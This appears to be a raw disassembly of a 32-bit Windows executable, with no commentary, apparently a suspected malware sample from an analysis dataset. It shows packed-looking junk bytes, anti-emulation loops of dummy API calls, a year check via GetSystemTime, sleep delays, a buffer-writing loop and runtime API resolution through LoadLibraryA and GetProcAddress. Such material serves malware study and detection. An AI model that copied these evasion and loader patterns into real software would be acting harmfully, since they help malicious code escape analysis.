salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
int 0xaa
scasd [ edi ]
xchg [ es : ecx - 0x29292947 ] edi
salc
salc
salc
salc
salc
iretd
sub_46b58d
sbb esi [ edx - 0x46618751 ]
mov ecx 0xd6d6d6d6
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
and bh cl
or edx [ edx + 0x203e2c1f ]
iretd
sub_46b6a9
mov ecx 0xb786c249
mov ecx 0x2e422cb9
inc esi
jbe r-xdata
salc
salc
salc
salc
salc
salc
salc
salc
adc [ esi - 0x46466b7a ] ch
pop ds
retn
inc esi
adc eax 0xd0b9462c
mov [ esi + 0x46 ] 0x46
int 0xb6
retn
sub_46b6c8
mov ecx 0x5603cdb9
scasd [ edi ]
jpe r-xdata
mov ecx 0xe4afd6b9
mov bh [ ecx - 0x29292947 ]
salc
salc
salc
salc
scasd [ edi ]
int 0x98
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
iretd
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc [ esi - 0x46466b7a ] ch
pop ds
retn
sub_46b750
add edi [ edx - 0x5045f433 ]
fdiv [ edx - 0x29294647 ]
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
lds eax [ edi - 0x45f430ae ]
scasd [ edi ]
cmp [ fs : ecx - 0x29292947 ] 0xd6
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
dec esi
inc esp
inc esi
inc esi
iretd
sub_46b82e
cmp al [ edx + 0x46 ]
inc esi
lds esp [ ebx ]
mov [ 0xfffffffffe201546 ] al
inc edi
inc esi
scasd [ edi ]
dec ecx
stosb [ edi ]
mov ecx 0xd6d6d6b9
and bh cl
sbb edi [ esi - 0x30df6733 ]
sbb edi [ edi + ebp * 4 - 0x464667a0 ]

sub_46b854
xchg edx eax
mov ebx 0x1516b9b9
scasd [ edi ]
mov ebx 0xb9b9b9a9
xor ah [ edx + 0x4e ]
int 0xbe
mov ecx 0xbec52211
mov ecx 0xfa65c249
mov ecx 0x6232b9b9
dec edx
sub al 0x46
inc esi
inc esi
push esi
inc esi
sub al 0x45
dec esi
iretd
sub_46b897
add ah [ edx + 0xa ]
push ss
adc [ ecx ] edx
sub al 0x66
adc [ edi + 0x4646419e ] ebp
salc
salc
salc
salc
salc
salc
int 0x87
scasd [ edi ]
mov bl 0xad
mov ecx 0xd6d6d6b9
salc
salc
salc
iretd
sub_46b93b
cmp edi [ edx - 0x46499d51 ]
mov ecx 0xd6d6d6d6
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
pushad
and eax 0xcf15d12c
shr [ esi - 0x51b9b9ba ] 0x38
std
mov ecx 0x6682c5b9
iretd
sub_46b967
shl [ esi - 0x50b9b9ba ] 0x12
lea edi [ ecx - 0x29292947 ]
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
and bh cl
cmp esp [ edi + ebp * 4 - 0x464678f5 ]
salc
salc
salc
salc
salc
sub al 0x31
and bh cl
sbb esp [ edx + 0x413cf20 ]
int 0x9f
sbb al 0x20
iretd
sub_46b9ce
sti
mov ecx 0xb9462cb9
shr dl 0x1
inc esi
inc esi
inc esi
sbb [ eax ] ebx
scasd [ edi ]
out 0x9b al
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc ecx ebp
stosb [ edi ]
lds ebp [ edx - 0x798aeae2 ]
adc [ ecx ] dl
iretd
sub_46ba00
add edi [ edx - 0x3041fc31 ]
add esi [ edx + 0x464646fe ]
push es
dec ecx
in al 0xcf
sbb edi [ edx - 0x4644a551 ]
mov ecx 0x965602cb
dec ecx
int1
push edi
scasd [ edi ]
adc [ edx + 0x46 ] eax
inc esi
salc
dec ecx
retn
sub_46bab3
mov ecx 0x4a82c5b9
adc eax 0x11b9442c
dec edx
int 0x9e
lds edi [ ebp - 0x3c3cb647 ]
mov esi 0x8675b9b9
scasd [ edi ]
scasd [ edi ]
xchg edi eax
mov ecx 0xd6d6d6b9
salc
salc
salc
adc ecx ebp
stosb [ edi ]
scasd [ edi ]
push esi
mov edi 0xd6d6b9b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
dec ecx
retn 0xb16d
sub_46bafa
mov ecx 0x4484c5b9
scasd [ edi ]
int 0xbf
mov ecx 0xd6d6d6b9
and bh cl
add esi [ edx + 0x3cf201e ]
mov al 0x75
xchg [ edx + eax ] ch
and bh cl
add edi [ esi - 0x4662a351 ]
mov ecx 0x662cd6d6
and bh cl
or ebp [ esi - 0x30dfebe1 ]
or ebp [ ebp + ecx * 8 + 0xbcf208e ]
stosb [ edi ]
pop ds
sub al 0x1e
and bh cl
add esi [ edx - 0x4655d951 ]
mov ecx 0x381d6d6
mov bl 0x2c
inc esi
sub al 0x46
and [ ecx - 0x694640fd ] al
iretd
sub_46bb63
add esp [ edi + ebp * 4 + 0x46464495 ]
scasb [ edi ]
leave
out dx eax
mov ecx 0xf92cafb9
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
int 0xb6
retn
sub_46bb85
mov ecx 0xe8c4afb9
mov ecx 0xd6d6d6b9
adc ecx ebp
stosb [ edi ]
pop ss
adc eax 0xf1af1110
test al 0xb9
mov ecx 0xd6d6d6d6
salc
salc
salc
salc
salc
salc
salc
sub al 0x42
iretd
sub_46bbd5
mov ecx 0x7612eb9
sbb eax 0xdac0cf11
inc esi
inc esi
inc esi
scasb [ edi ]
mov edi 0xcfb9b9fe
shl dh 0x46
inc esi
inc esi
lds eax [ edx - 0x507f328a ]
int 0x8d
mov ecx 0xd6d6d6b9
salc
push ds
sub al 0x2f
and bh cl
add ebp [ edx + 0x20302c1e ]
iretd
sub_46bc08
add ebp [ eax - 0x466ae551 ]
mov ecx 0x8f198675
test esi edx
salc
mov ecx 0x86c31211
scasd [ edi ]
or dl [ ebx - 0x29294647 ]
salc
salc
salc
salc
salc
mov cl 0x33
push esi
add bl al
xchg esp eax
dec ecx
retn
sub_46bc2f
inc ebp
inc esi
inc esi
inc esi
inc ebp
xor edx [ edx + 0x7 ]
jge r-xdata
mov ecx 0xcf2096cd
sbb esp [ eax + 0x75b23bcf ]
mov ecx 0x613cf20
scasd [ edi ]
dec edx
dec ecx
les ecx [ ebx - 0x74 ]
mov ecx 0xa159afb9
mov ecx 0x2096cdb9
iretd
sub_46bc64
lds esp [ esi - 0x3e514647 ]
mov ebx 0x37afb9b9
cmpsb [ esi ] [ edi ]
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
sub al 0x68
and bh cl
or esi [ edi + ebx - 0x4df430e0 ]
int 0x8e
and bh cl
add edi [ ebp + esi * 2 + 0x203e2c86 ]
iretd
sub_46bcda
mov ecx 0xbbcac3cb
mov ecx 0xf04caeb9
mov ecx 0xae13cbb9
scasb [ edi ]
cmp al 0xe8
mov ecx 0xac0bafb9
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
int 0xc6
loop r-xdata
mov ecx 0x4986c31f
retn 0x464c
inc esi
inc esi
lds eax [ esi - 0x785d50b2 ]
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
dec esi
inc esp
inc esi
inc esi

sub_46bd7c
cmc
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
int3
sub_46bd9a
mov esp 0xc249816d
leave
cdq
mov ecx 0x4aaf19b9
stc
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
adc [ edi - 0x464646a3 ] ebp
salc
salc
salc

sub_46bdca
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
jne r-xdata
retn 0xaece
test esi edx
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
mov ecx 0x3c5be03
mov edx 0x7f1f1f6e
add edi [ esi - 0x46111c51 ]
mov ecx 0xd6d6d6d6
salc
pop [ ebp + 0x19d6d6d6 ]
pop [ ebp - 0x3cdf292a ]
mov al 0xaf
test al 0xb5
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
push ds
sub al 0xf
and bh cl
add esp [ edx + 0x20222c1e ]
iretd
sub_46be6b
xchg [ ecx - 0x3e ] cl
lahf
xchg ebx eax
mov ecx 0x68675b9
scasd [ edi ]
xchg ebp eax
xchg ebx eax
mov ecx 0x4487c5b9
scasd [ edi ]
xlat
mov edi 0xd6d6b9b9
salc
salc
salc
salc
scasb [ edi ]
popfd
0x13cbb9b9 0xaeb2
sub_46bee9
inc ebx
idiv [ ecx + 0x7a07cdb9 ]
inc ebp
xchg [ ecx - 0x3e ] ecx
mov esp 0xc7b9b9f6
jle r-xdata
salc
salc
dec ecx
retn
add eax [ esi + 0x46 ]
scasd [ edi ]
pop ecx
sahf
mov ecx 0xdeafd6b9
hlt
sub_46bf15
sbb ebp [ eax - 0x798a4647 ]
scasd [ edi ]
pop es
movsb [ edi ] [ esi ]
mov ecx 0x8e1bcfb9
adc [ edi - 0x46461124 ] ebp
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
iretd
sub_46bf88
salc
salc
salc
salc
salc
salc
salc
scasb [ edi ]
cli
cwde
mov ecx 0xc31f1fb9
xchg [ ecx - 0x3d ] cl
sbb dh ch
mov ecx 0xd203cbb9
scasd [ edi ]
call 0xffffffffd700794c
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
retn
sub_46bfea
mov [ 0xffffffffd6d6b9b9 ] eax
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc ecx ebp
stosb [ edi ]
pop ss
adc eax 0xc9af1110
cli
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
dec ecx
retn 0x86e1
sub_46c057
add esp [ eax - 0x32d7d3e2 ]
mov gs [ edi - 0x4646608d ]
salc
push ds
and bh cl
add edi [ edx - 0x30df798b ]
add edi [ eax + 0x16b603cb ]
scasd [ edi ]
das
xchg [ ecx - 0x29292947 ] bh
salc
salc
adc [ ecx ] edx
adc ebx ecx
retn 0xfa62
sub_46c084
inc esp
inc esi
inc esi
push ss
mov ecx 0xb9111610
shr dl 0x1
inc esi
inc esi
inc esi
int 0x5
push edx
scasd [ edi ]
dec edx
mov ebp 0x49d6b9b9
retn 0x963a
sub_46c09f
mov ecx 0x8398aeb9
mov ecx 0xbc94afb9
mov ecx 0xaf1fd6b9
xor [ ebx - 0x29294647 ] esi
salc
salc
salc
salc
salc
lds eax [ edx - 0x553c34b6 ]
mov ebx 0xb916b9b9
adc [ edx - 0x35 ] ebp
retn
sub_46c0d6
scasb [ edi ]
mov edx 0xaf16b9b9
add al 0xb4
mov ecx 0x80cd16b9
scasd [ edi ]
xor eax 0xd6b9b9a3
salc
salc
salc
push cs
test esi edx
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc eax 0xbcfac3cb
mov ecx 0x3cb16b9
xchg esi eax
scasd [ edi ]
fstp [ ecx + edi * 4 - 0x50292947 ]
inc esi
cdq
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc [ 0xffffffffcf0610b9 ] edx
add esi [ edx - 0x3db67e83 ]
jpo r-xdata
sub [ edi - 0x46465ccb ] 0xd6
mov ecx 0x2e422cb9
inc esi
jbe r-xdata
inc ecx
dec edx
jne r-xdata
inc esi
push ss
adc [ ecx + 0x4646c6d0 ] edi
inc esi
iretd
nop
mov ebx ecx
add ebx eax
mov [ ebx ] 0x67
nop
nop
xor eax eax
pop ebx
retn
sub_46c16c
push ebx
mov edx ecx
test edx edx
jbe r-xdata
xor eax eax
pop ebx
retn
mov ecx 0x1
nop
mov ebx ecx
add ebx eax
mov [ ebx ] 0x67
nop
nop
inc ecx
dec edx
jne r-xdata
sub_46c18c
push ebx
push 0x0
call CopyIcon
mov ebx 0xb9ab1a9
nop
nop
nop
nop
dec ebx
jne r-xdata
mov eax 0x1da81025
call sub_4026bc
mov ebx eax
test ebx ebx
jne r-xdata
mov [ rw-data ] 0x17a61
mov ecx 0x1da81025
xor edx edx
mov eax ebx
call sub_46c16c
push 0x0
call CopyIcon
nop
nop
mov eax ebx
call sub_4026dc
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ rw-data ] eax
mov ebx 0xc1d4
nop
pop ebx
retn
push 0x0
call CopyIcon
dec ebx
jne r-xdata
nop
push 0x0
call sub_466400
push 0x0
call CopyIcon
pop ebx
retn
sub_46c231
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_46c259
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c260
retn
sub_46c264
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi rw-data
xor eax eax
push ebp
push sub_46c405
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c40c
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
lea edx [ ebp - 0x4 ]
xor eax eax
call sub_4029e4
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_40c078
test eax eax
jne r-xdata
nop
mov ebx 0x1657
push 0x0
call CopyIcon
dec ebx
jne r-xdata
push 0x0
call CopyIcon
mov ebx 0x23c69
push 0x0
call CopyIcon
nop
nop
dec ebx
jne r-xdata
nop
push 0x0
push 0x0
call SelectClipRgn
nop
call GetLastError
cmp eax 0x6
je r-xdata
mov eax 0x24472784
call sub_4026bc
mov ebx eax
nop
test ebx ebx
je r-xdata
nop
nop
jmp r-xdata
mov ecx 0x24472784
xor edx edx
mov eax ebx
call sub_46c16c
push r-xdata
push r-xdata
call __imp_LoadLibraryA
push eax
call GetProcAddress
mov [ rw-data ] eax
push 0x0
call CopyIcon
mov eax ebx
call sub_4026dc
mov ebx 0x8bfe
nop
nop
push 0x0
call CopyIcon
dec ebx
jne r-xdata
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] 0x0
push rw-data
call GetSystemTime
nop
nop
cmp [ rw-data ] 0x7e1
jae r-xdata
jmp r-xdata
xor ebx ebx
nop
nop
xor esi esi
jmp r-xdata
nop
nop
cmp ebx 0x3
jle r-xdata
inc ebx
nop
push 0x0
call CopyIcon
mov esi [ edi + 0x4 ]
nop
nop
push 0x0
push 0x18e
call SleepEx
nop
nop
jmp r-xdata
nop
nop
call sub_46c18c
nop
nop
jmp r-xdata
nop
nop
mov [ edi ] 0x8
xor eax eax
mov [ edi + 0x4 ] eax
nop
nop
push edi
call [ rw-data ]
mov eax [ edi + 0x4 ]
sub eax esi
cmp eax 0xca
jbe r-xdata
sub_46c5ea
inc edx
add [ eax + esi * 8 - 0x3697ffbe ] ah
inc edx
add [ eax ] bh
leave
inc edx
add al ah
enter 0x42 0xa4
enter 0x42 0x9c
jns r-xdata
inc ebx
add [ eax - 0x77ffbda9 ] bh
push edi
inc edx
add [ ebp + edi * 8 + 0x45 ] ch
add [ eax ] dl
std
inc ebp
add ah dl
pop es
inc esi
add [ edi + eax + 0x316c0046 ] ah
inc esi
add [ ecx + esi ] bh
inc esi
add [ edx + esi ] dh
inc esi
add [ edx + esi ] al
inc esi
add [ eax + 0x60780046 ] dh
inc esi
add [ edx + eax * 8 + 0x46 ] ah
add [ edx + eax * 8 ] dh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax - 0x3c ] ah
inc esi
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff0
mov eax r-xdata
call sub_405da4
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e810
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_45e828
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e8a8
call sub_403ecc
add [ ecx + edi * 2 + 0x43 ] ch
add [ eax ] dl
inc edx
add al al
int1
inc edx
add [ eax - 0xe ] ch
inc edx
add [ eax ] bl
inc edx
add [ edx + eax * 8 - 0x3d9bffbe ] dl
inc edx
add [ eax ] ah
hlt
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax r-xdata
call sub_405da4
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e810
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_45e828
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e8a8
call sub_403ecc
sub_40114f
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4056fc
sub_401159
add [ esp + 0x4 ] 0xfffffff8
jmp sub_405710
ExitProcess
jmp [ __import_lookup_table_0(kernel32:ExitProcess) ]
sub_40122c
jmp [ __import_lookup_table_1(user32:MessageBoxA) ]
FindClose
jmp [ FindClose@IAT ]
FindFirstFileA
jmp [ __import_lookup_table_0(kernel32:FindFirstFileA) ]
sub_401244
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
GetCommandLineA
jmp [ GetCommandLineA@IAT ]
sub_401254
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
sub_40125c
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
sub_401264
jmp [ __import_lookup_table_0(kernel32:GetModuleHandleA) ]
sub_40126c
jmp [ __import_lookup_table_0(kernel32:GetProcAddress) ]
GetStartupInfoA
jmp [ GetStartupInfoA@IAT ]
sub_40128c
jmp [ __import_lookup_table_1(user32:LoadStringA) ]
MultiByteToWideChar
jmp [ MultiByteToWideChar@IAT ]
sub_4012ac
jmp [ __import_lookup_table_2(advapi32:RegCloseKey) ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
sub_4012cc
jmp [ __import_lookup_table_0(kernel32:VirtualQuery) ]
SysAllocStringLen
jmp [ SysAllocStringLen@IAT ]
SysReAllocStringLen
jmp [ SysReAllocStringLen@IAT ]
SysFreeString
jmp [ __import_lookup_table_3(oleaut32:SysFreeString) ]
InterlockedIncrement
jmp [ InterlockedIncrement@IAT ]
InterlockedDecrement
jmp [ __import_lookup_table_0(kernel32:InterlockedDecrement) ]
sub_4012fc
jmp [ __import_lookup_table_0(kernel32:GetCurrentThreadId) ]
sub_40130c
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_401330
jmp [ __import_lookup_table_0(kernel32:LocalAlloc) ]
VirtualFree
jmp [ VirtualFree@IAT ]
sub_401350
jmp [ __import_lookup_table_0(kernel32:InitializeCriticalSection) ]
sub_401358
jmp [ __import_lookup_table_0(kernel32:EnterCriticalSection) ]
sub_401360
jmp [ __import_lookup_table_0(kernel32:LeaveCriticalSection) ]
sub_401368
jmp [ __import_lookup_table_0(kernel32:DeleteCriticalSection) ]
sub_401ab2
jmp sub_4039c0
sub_401ab9
mov al [ rw-data ]
pop ebp
retn
sub_401b96
jmp sub_4039c0
sub_401c64
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_402278
retn
sub_402264
jmp sub_4039c0
sub_40240a
jmp sub_4039c0
sub_4026a9
jmp sub_4039c0
sub_40276c
call sub_405d58
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_405d58
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_4027c0
mov [ rw-data ] edx
call sub_403fa4
sub_402824
push eax
push edx
push ecx
call sub_405d58
cmp [ eax + 0x4 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_402818
retn
sub_402840
retn
sub_402894
retn
sub_402898
push ebx
call sub_405d58
mov ebx [ eax + 0x4 ]
call sub_405d58
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_402a50
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_402a60
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_402ad8
mov edx [ eax + 0x1c ]
call sub_402a90
retn
sub_402b6b
retn
sub_402b6c
xor ecx ecx
mov cl [ edx ]
inc ecx
xchg edx eax
call sub_4028b8
retn
sub_402d7c
mov ecx 0xff
call sub_402d88
retn
sub_402dac
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
j_sub_402dc8
jmp sub_402dc8
sub_402dc5
retn
sub_403155
jmp sub_4039c0
sub_4031a8
fninit
fwait
fldcw [ rw-data ]
retn
sub_4031f8
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_403204
push ebx
mov ebx eax
mov eax ebx
call sub_403234
call sub_4026bc
mov edx eax
mov eax ebx
call sub_403278
pop ebx
retn
sub_403220
push ebx
mov ebx eax
mov eax ebx
call sub_4032d0
mov eax ebx
call sub_4026dc
pop ebx
retn
sub_403234
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_40325c
call sub_4035f8
test dl dl
jle r-xdata
retn
call sub_4035e0
sub_40331c
retn
sub_4033a4
jmp sub_4039c0
sub_4033ab
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4034b4
mov eax 0x8000ffff
retn
sub_4034bc
retn
sub_4034c0
retn
sub_4034c4
retn
sub_4035b9
jmp sub_40370c
sub_4035be
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_403a20
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_4035e0
sub_4035e0
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_4035e8
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax ebx
pop ebx
retn
sub_4035f8
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_403608
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_4036d0
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_4036ec
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_403ab9
retn
sub_403bfc
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_403c8a
jmp sub_40370c
sub_403cea
jmp sub_40370c
sub_403d04
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_403bfc
mov [ rw-data ] 0x0
call sub_403ca4
retn
sub_403e3d
retn
sub_403f9f
pop ebp
pop edi
pop esi
pop ebx
retn
sub_403fa4
mov [ rw-data ] eax
call sub_403ecc
sub_4041e0
retn
sub_40421c
retn
sub_40422a
retn
sub_404243
retn
sub_404254
retn
sub_40433b
retn
sub_40446c
test eax eax
je r-xdata
retn
mov edx [ eax - 0x8 ]
inc edx
jle r-xdata
[ eax - 0x8 ]
j_sub_404488#2
jmp sub_404488
sub_4044d1
retn
sub_4044d9
retn
sub_40451b
retn
sub_404674
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402818
sub_40468c
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call SysFreeString
sub_4047e4
retn
sub_4047f6
retn
sub_4047f8
test eax eax
je r-xdata
mov eax r-xdata
retn
retn
sub_4049ec
mov ecx 0x1
jmp sub_404958
sub_4049f6
retn
sub_404a2c
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402818
call [ rw-data ]
retn
sub_404b30
mov ecx 0x1
jmp sub_404a44
sub_404b3a
retn
sub_404b3c
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402818
call [ rw-data ]
retn
sub_404d62
retn
sub_404d64
push edx
call sub_4026bc
pop edx
test eax eax
je r-xdata
retn
push eax
call sub_4049ec
pop eax
sub_404d78
push eax
call sub_404b30
pop eax
call sub_4026dc
retn
sub_404d88
mov al 0x11
jmp sub_402818
sub_404db3
retn
sub_404dc4
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404c70
pop ebp
retn 0x4
j_sub_404a44
jmp sub_404a44
sub_404dd9
retn
sub_404ddc
call sub_404f7c
retn
sub_405008
call sub_404fe0
retn
sub_405351
jmp sub_4039c0
sub_4054bc
call sub_4054cc
retn
sub_4054c4
call sub_4054ec
retn
sub_4054cc
push ebx
mov ebx eax
mov eax 0x8
call sub_4026bc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_405587
jmp sub_40370c
sub_4055a8
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_40561c
jmp sub_4039c0
sub_405623
pop ecx
pop ebp
retn
sub_40569c
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_4056a8
add eax 0x4
push eax
call InterlockedDecrement
retn
sub_4056b4
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_402818
sub_4056c4
call sub_403204
mov [ eax + 0x4 ] 0x1
retn
sub_4056fc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call InterlockedIncrement
pop ebp
retn 0x4
sub_4059eb
jmp sub_4039c0
sub_4059f2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405a8f
jmp sub_4039c0
sub_405a96
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405adf
jmp sub_4039c0
sub_405ae6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405baa
jmp sub_4039c0
sub_405bb1
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_405c02
jmp sub_4039c0
sub_405c09
pop ebp
retn
sub_405ce0
jmp [ __import_lookup_table_4(kernel32:GetModuleHandleA) ]
LocalAlloc
jmp [ __import_lookup_table_4(kernel32:LocalAlloc) ]
TlsSetValue
jmp [ TlsSetValue@IAT ]
sub_405d00
push eax
push 0x40
call LocalAlloc
retn
sub_405d0c
mov eax 0x10
retn
sub_405d98
mov eax rw-data
call sub_4055a8
retn
sub_405e0d
jmp sub_4039c0
sub_405e14
pop ebp
retn
sub_405e18
sub [ rw-data ] 0x1
retn
sub_405e20
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_405e3c
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_405e85
jmp sub_4039c0
sub_405e8c
pop ebp
retn
sub_405e90
sub [ rw-data ] 0x1
retn
RegCloseKey
jmp [ __import_lookup_table_5(advapi32:RegCloseKey) ]
RegOpenKeyExA
jmp [ __import_lookup_table_5(advapi32:RegOpenKeyExA) ]
RegQueryValueExA
jmp [ __import_lookup_table_5(advapi32:RegQueryValueExA) ]
CompareStringA
jmp [ CompareStringA@IAT ]
CreateFileA
jmp [ CreateFileA@IAT ]
CreateThread
jmp [ __import_lookup_table_6(kernel32:CreateThread) ]
FindResourceA
jmp [ __import_lookup_table_6(kernel32:FindResourceA) ]
FormatMessageA
jmp [ FormatMessageA@IAT ]
InterlockedExchange
jmp [ InterlockedExchange@IAT ]
FreeResource
jmp [ FreeResource@IAT ]
GetACP
jmp [ GetACP@IAT ]
GetCPInfo
jmp [ __import_lookup_table_6(kernel32:GetCPInfo) ]
GetCurrentProcessId
